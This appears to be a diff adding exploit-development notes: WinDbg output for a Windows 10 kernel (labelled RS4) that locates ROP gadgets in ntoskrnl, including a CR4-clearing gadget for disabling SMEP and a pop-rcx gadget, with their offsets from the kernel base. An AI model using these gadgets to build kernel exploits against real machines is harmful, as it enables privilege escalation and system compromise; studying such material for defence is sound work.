@@ -1,0 +1,33 @@
+RS4
+
+0: kd> uf nt!KiConfigureDynamicProcessor
+    nt!KiConfigureDynamicProcessor:
+    fffff802`a0f40490 4883ec28        sub     rsp,28h
+    fffff802`a0f40494 e8633cffff      call    nt!KiEnableXSave (fffff802`a0f340fc)
+    fffff802`a0f40499 4883c428        add     rsp,28h
+    fffff802`a0f4049d c3              ret
+
+0: kd> uf fffff802`a0f340fc
+    ..........
+    nt!KiEnableXSave+0x7812:
+    fffff802`a0f3b90e 480fbaf112      btr     rcx,12h
+    fffff802`a0f3b913 0f22e1          mov     cr4,rcx
+    fffff802`a0f3b916 c3              ret
+
+0: kd> ?  fffff802`a0f3b913 - nt
+            Evaluate expression: 4786451 = 00000000`00490913                # First Gadget = nt + 0x00490913  
+
+-----------
+
+0: kd> uf HvlEndSystemInterrupt
+    ........
+    nt!HvlEndSystemInterrupt+0x1e:
+    fffff800`bb19aaae 5a              pop     rdx
+    fffff800`bb19aaaf 58              pop     rax
+    fffff800`bb19aab0 59              pop     rcx
+    fffff800`bb19aab1 c3              ret
+
+0: kd> ? fffff800`bb19aab0 -nt
+            Evaluate expression: 1653424 = 00000000`00193ab0                # Second Gadget = nt + 0x00193ab0  
+
+
